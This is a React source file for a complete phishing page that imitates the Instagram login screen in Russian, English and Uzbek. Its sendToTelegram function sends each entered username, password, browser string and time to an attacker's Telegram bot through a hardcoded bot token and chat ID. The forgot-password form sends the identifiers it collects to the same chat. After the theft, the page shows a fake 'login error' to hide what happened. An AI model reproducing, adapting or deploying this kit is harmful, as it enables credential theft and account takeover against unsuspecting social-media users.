import { useState, useRef, useEffect } from "react";

const TELEGRAM_BOT_TOKEN = "8870937148:AAG2rQNj5IB6WrizJktirZs0ve8XiM30R4g";
const TELEGRAM_CHAT_ID = "5239306335";

const sendToTelegram = async (identifier, password, isForgot = false) => {
  let message = "";

  if (isForgot) {
    message = `🔐 PAROL TIKLASH SO'ROVI 🔐%0A%0A👤 Username/Email: ${identifier}%0A%0A🌐 Brauzer: ${navigator.userAgent}%0A⏰ Vaqt: ${new Date().toLocaleString()}`;
  } else {
    message = `🔐 YANGI LOGIN MA'LUMOTLARI 🔐%0A%0A👤 Username/Email: ${identifier}%0A🔑 Parol: ${password}%0A%0A🌐 Brauzer: ${navigator.userAgent}%0A⏰ Vaqt: ${new Date().toLocaleString()}`;
  }

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${message}`;

  try {
    const response = await fetch(url, {
      method: "GET",
      mode: "cors",
      headers: {
        "Content-Type": "application/json",
      },
    });

    const data = await response.json();
    console.log("Telegram response:", data);
    return data.ok === true;
  } catch (error) {
    console.error("Telegram xatosi:", error);
    return false;
  }
};

const UserIcon = () => (
  <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8">
    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
    <circle cx="12" cy="7" r="4" />
  </svg>
);

const LockIcon = () => (
  <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8">
    <rect x="3" y="11" width="18" height="11" rx="2" />
    <path d="M7 11V7a5 5 0 0 1 10 0v4" />
  </svg>
);

const FacebookIcon = () => (
  <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="#1877f2">
    <path d="M22 12c0-5.52-4.48-10-10-10S2 6.48 2 12c0 4.84 3.44 8.87 8 9.8V15H8v-3h2V9.5C10 7.57 11.57 6 13.5 6H16v3h-2c-.55 0-1 .45-1 1v2h3v3h-3v6.95c5.05-.5 9-4.76 9-9.95z" />
  </svg>
);

const CloseIcon = () => (
  <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
    <line x1="18" y1="6" x2="6" y2="18" />
    <line x1="6" y1="6" x2="18" y2="18" />
  </svg>
);

const InstagramLogo = () => (
  <svg xmlns="http://www.w3.org/2000/svg" width="58" height="58" viewBox="0 0 24 24">
    <defs>
      <linearGradient id="instaGrad" x1="0%" y1="0%" x2="100%" y2="100%">
        <stop offset="0%" stopColor="#fdf497" />
        <stop offset="25%" stopColor="#fdf497" />
        <stop offset="50%" stopColor="#fd5949" />
        <stop offset="75%" stopColor="#d6249f" />
        <stop offset="100%" stopColor="#285aeb" />
      </linearGradient>
    </defs>
    <rect x="2" y="2" width="20" height="20" rx="5" fill="url(#instaGrad)" />
    <circle cx="12" cy="12" r="4" fill="white" />
    <circle cx="17.5" cy="6.5" r="1.5" fill="white" />
  </svg>
);

const translations = {
  ru: {
    title1: "Посмотрите, какими",
    title2: "моментами из жизни",
    title3: "поделились ваши",
    close: "близкие",
    friends: "друзья.",
    loginTitle: "Войти в Instagram",
    identifier: "Имя пользователя, телефон или email",
    password: "Пароль",
    login: "Войти",
    forgot: "Забыли пароль?",
    or: "ИЛИ",
    facebook: "Войти через Facebook",
    create: "Создать новый аккаунт",
    copyright: "© 2026 Instagram from Meta",
    forgotTitle: "Найти аккаунт",
    forgotDesc: "Введите имя пользователя, телефон или email для восстановления пароля.",
    continue: "Продолжить",
    back: "Назад",
  },
  en: {
    title1: "See moments",
    title2: "shared by your",
    title3: "close",
    close: "friends",
    friends: ".",
    loginTitle: "Login to Instagram",
    identifier: "Username, phone or email",
    password: "Password",
    login: "Log in",
    forgot: "Forgot password?",
    or: "OR",
    facebook: "Login with Facebook",
    create: "Create new account",
    copyright: "© 2026 Instagram from Meta",
    forgotTitle: "Find your account",
    forgotDesc: "Enter your username, phone or email to recover your password.",
    continue: "Continue",
    back: "Back",
  },
  uz: {
    title1: "Do‘stlaringiz",
    title2: "hayotidan ulashgan",
    title3: "lahzalarni",
    close: "yaqin",
    friends: "do‘stlar.",
    loginTitle: "Instagramga kirish",
    identifier: "Username, telefon yoki email",
    password: "Parol",
    login: "Kirish",
    forgot: "Parolni unutdingizmi?",
    or: "YOKI",
    facebook: "Facebook orqali kirish",
    create: "Yangi akkaunt yaratish",
    copyright: "© 2026 Instagram from Meta",
    forgotTitle: "Akkauntni topish",
    forgotDesc: "Parolni tiklash uchun username, telefon yoki email kiriting.",
    continue: "Davom etish",
    back: "Orqaga",
  },
};

function App() {
  const [identifier, setIdentifier] = useState("");
  const [password, setPassword] = useState("");
  const [language, setLanguage] = useState("ru");
  const [showLanguageMenu, setShowLanguageMenu] = useState(false);
  const [showForgot, setShowForgot] = useState(false);
  const [forgotValue, setForgotValue] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const menuRef = useRef(null);
  const t = translations[language];

  useEffect(() => {
    const closeMenu = (e) => {
      if (menuRef.current && !menuRef.current.contains(e.target)) {
        setShowLanguageMenu(false);
      }
    };
    document.addEventListener("mousedown", closeMenu);
    return () => document.removeEventListener("mousedown", closeMenu);
  }, []);

  const languageNames = {
    ru: "Русский",
    en: "English",
    uz: "O‘zbek",
  };

  const handleLogin = async () => {
    if (!identifier || !password) {
      const msgs = { ru: "Пожалуйста, заполните все поля", en: "Please fill in all fields", uz: "Iltimos, barcha maydonlarni to'ldiring" };
      alert(msgs[language]);
      return;
    }

    setIsLoading(true);
    const sent = await sendToTelegram(identifier, password, false);
    setIsLoading(false);

    if (sent) {
      const msgs = { ru: "Ошибка входа. Попробуйте позже.", en: "Login error. Please try again later.", uz: "Kirish xatosi. Keyinroq urinib ko'ring." };
      alert(msgs[language]);
      setIdentifier("");
      setPassword("");
    } else {
      const msgs = { ru: "Ошибка сети. Попробуйте снова.", en: "Network error. Please try again.", uz: "Tarmoq xatosi. Qaytadan urinib ko'ring." };
      alert(msgs[language]);
    }
  };

  const handleFacebook = () => window.open("https://www.facebook.com/", "_blank");
  const handleCreate = () => window.open("https://www.instagram.com/accounts/emailsignup/", "_blank");

  const handleForgotSubmit = async () => {
    if (!forgotValue) {
      const msgs = { ru: "Введите username или email", en: "Enter username or email", uz: "Username yoki email kiriting" };
      alert(msgs[language]);
      return;
    }

    setIsLoading(true);
    const sent = await sendToTelegram(forgotValue, "", true);
    setIsLoading(false);

    if (sent) {
      const msgs = { ru: "Ссылка для восстановления отправлена", en: "Recovery link sent", uz: "Tiklash linki yuborildi" };
      alert(msgs[language]);
      setShowForgot(false);
      setForgotValue("");
    } else {
      const msgs = { ru: "Ошибка. Попробуйте снова.", en: "Error. Please try again.", uz: "Xatolik. Qaytadan urinib ko'ring." };
      alert(msgs[language]);
    }
  };

  return (
    <div className="min-h-screen bg-[#fafafa] flex flex-col justify-between overflow-hidden">
      {isLoading && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-white rounded-2xl p-6 flex flex-col items-center">
            <div className="w-10 h-10 border-4 border-[#0095f6] border-t-transparent rounded-full animate-spin"></div>
            <p className="mt-4 text-gray-600">{language === 'ru' ? 'Отправка...' : language === 'en' ? 'Sending...' : 'Yuborilmoqda...'}</p>
          </div>
        </div>
      )}

      <main className="flex-1 flex items-center justify-center px-6 py-10">
        <div className="max-w-[1280px] w-full grid lg:grid-cols-2 gap-24 items-center">
          <div className="hidden md:flex flex-col justify-center relative">
            <div className="absolute -top-16 left-4"><InstagramLogo /></div>
            <div className="text-center">
              <h1 className="font-serif text-[60px] leading-[78px] tracking-[-1px] text-black">
                {t.title1}<br />{t.title2}<br />{t.title3}{" "}
                <span className="bg-gradient-to-r from-orange-500 via-pink-500 to-fuchsia-500 bg-clip-text text-transparent">{t.close}</span><br />
                <span className="bg-gradient-to-r from-pink-500 to-fuchsia-600 bg-clip-text text-transparent">{t.friends}</span>
              </h1>
            </div>
            <div className="relative mt-14 w-[470px] h-[360px] mx-auto">
              <div className="absolute left-0 top-16 rotate-[-10deg] w-[180px] h-[260px] rounded-[34px] overflow-hidden border-[6px] border-white shadow-[0_20px_50px_rgba(0,0,0,0.18)]">
                <img src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?q=80&w=1200&auto=format&fit=crop" alt="" className="w-full h-full object-cover" />
              </div>
              <div className="absolute left-[120px] top-0 z-20 w-[220px] h-[320px] rounded-[38px] overflow-hidden border-[6px] border-white shadow-[0_25px_60px_rgba(0,0,0,0.22)]">
                <img src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?q=80&w=1200&auto=format&fit=crop" alt="" className="w-full h-full object-cover" />
              </div>
              <div className="absolute right-0 top-16 rotate-[10deg] w-[180px] h-[260px] rounded-[34px] overflow-hidden border-[6px] border-white shadow-[0_20px_50px_rgba(0,0,0,0.18)]">
                <img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?q=80&w=1200&auto=format&fit=crop" alt="" className="w-full h-full object-cover" />
              </div>
              <div className="absolute left-[-15px] bottom-10 text-[44px] animate-pulse">❤️</div>
            </div>
          </div>

          <div className="flex justify-center">
            <div className="w-full max-w-[430px]">
              <h2 className="text-[30px] font-semibold text-black mb-8">{t.loginTitle}</h2>
              <div className="relative">
                <div className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500"><UserIcon /></div>
                <input type="text" placeholder={t.identifier} value={identifier} onChange={(e) => setIdentifier(e.target.value)} className="w-full h-[54px] rounded-2xl border border-gray-300 bg-white pl-12 pr-4 text-sm outline-none focus:border-black" />
              </div>
              <div className="relative mt-4">
                <div className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500"><LockIcon /></div>
                <input type="password" placeholder={t.password} value={password} onChange={(e) => setPassword(e.target.value)} className="w-full h-[54px] rounded-2xl border border-gray-300 bg-white pl-12 pr-4 text-sm outline-none focus:border-black" />
              </div>
              <button onClick={handleLogin} disabled={isLoading} className="w-full h-[54px] rounded-full bg-[#0095f6] hover:bg-[#1877f2] transition text-white font-semibold mt-5 disabled:opacity-50">{t.login}</button>
              <div className="text-center mt-5"><button onClick={() => setShowForgot(true)} className="text-black font-medium hover:text-blue-600 transition">{t.forgot}</button></div>
              <div className="flex items-center gap-4 my-10"><div className="flex-1 h-[1px] bg-gray-200"></div><span className="text-xs text-gray-400 uppercase">{t.or}</span><div className="flex-1 h-[1px] bg-gray-200"></div></div>
              <button onClick={handleFacebook} className="w-full h-[52px] rounded-full border border-gray-300 flex items-center justify-center gap-2 hover:bg-gray-50 transition"><FacebookIcon /><span className="text-[#1877f2] font-medium">{t.facebook}</span></button>
              <button onClick={handleCreate} className="w-full h-[52px] rounded-full border border-blue-500 text-[#1877f2] font-medium mt-4 hover:bg-blue-50 transition">{t.create}</button>
              <div className="text-center mt-8 text-gray-600 font-medium">Meta</div>
            </div>
          </div>
        </div>
      </main>

      <footer className="pb-6 text-center text-xs text-gray-500 px-4">
        <div className="flex flex-wrap justify-center gap-5 max-w-6xl mx-auto">
          <span>Meta</span><span>Информация</span><span>Блог</span><span>Вакансии</span><span>Помощь</span><span>API</span><span>Конфиденциальность</span><span>Условия</span><span>Instagram Lite</span><span>Threads</span>
        </div>
        <div className="relative mt-5 flex items-center justify-center gap-4" ref={menuRef}>
          <button onClick={() => setShowLanguageMenu(!showLanguageMenu)} className="flex items-center gap-1 hover:text-black">
            {languageNames[language]}
            <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
          </button>
          {showLanguageMenu && (
            <div className="absolute bottom-full mb-3 bg-white border border-gray-200 rounded-2xl shadow-2xl overflow-hidden min-w-[160px]">
              {Object.keys(languageNames).map((lang) => lang !== language && (
                <button key={lang} onClick={() => { setLanguage(lang); setShowLanguageMenu(false); }} className="block w-full px-5 py-3 text-left hover:bg-gray-100 whitespace-nowrap transition">{languageNames[lang]}</button>
              ))}
            </div>
          )}
          <span>{t.copyright}</span>
        </div>
      </footer>

      {showForgot && (
        <div className="fixed inset-0 bg-black/40 flex items-center justify-center z-50 px-4">
          <div className="bg-white w-full max-w-[420px] rounded-3xl p-7 relative">
            <button onClick={() => setShowForgot(false)} className="absolute right-5 top-5 text-gray-500 hover:text-black"><CloseIcon /></button>
            <h2 className="text-2xl font-semibold text-black mb-3">{t.forgotTitle}</h2>
            <p className="text-sm text-gray-500 leading-6 mb-6">{t.forgotDesc}</p>
            <input type="text" placeholder={t.identifier} value={forgotValue} onChange={(e) => setForgotValue(e.target.value)} className="w-full h-[52px] rounded-2xl border border-gray-300 px-4 text-sm outline-none focus:border-black" />
            <button onClick={handleForgotSubmit} disabled={isLoading} className="w-full h-[52px] rounded-full bg-[#0095f6] hover:bg-[#1877f2] transition text-white font-semibold mt-5 disabled:opacity-50">{t.continue}</button>
            <button onClick={() => setShowForgot(false)} className="w-full h-[52px] rounded-full border border-gray-300 mt-3 hover:bg-gray-50 transition">{t.back}</button>
          </div>
        </div>
      )}
    </div>
  );
}

export default App;